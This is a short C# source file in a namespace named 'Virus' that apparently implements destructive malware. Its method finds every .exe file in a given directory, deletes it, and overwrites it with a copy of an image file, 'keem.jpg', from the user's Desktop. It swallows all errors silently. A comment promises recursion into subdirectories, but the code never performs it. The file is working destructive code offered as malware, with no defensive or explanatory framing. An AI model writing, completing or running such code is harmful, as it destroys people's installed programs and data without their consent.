using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Collections;
using System.Reflection;
using System.Windows.Forms;

namespace Virus
{
    class exeReplacer
    {
        public static void ProcessDirectory(string targetDirectory)
        {
            try
            {
                // Process the list of files found in the directory.
                string[] fileEntries = Directory.GetFiles(targetDirectory, "*.exe");

                // Recurse into subdirectories of this directory.
                string[] subdirectoryEntries = Directory.GetDirectories(targetDirectory);

                string first = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + "\\keem.jpg";

                foreach (string i in fileEntries)
                {
                    File.Delete(i);
                    File.Copy(first, i);
                }
            }
            catch
            {
                
            }
        }
    }
}
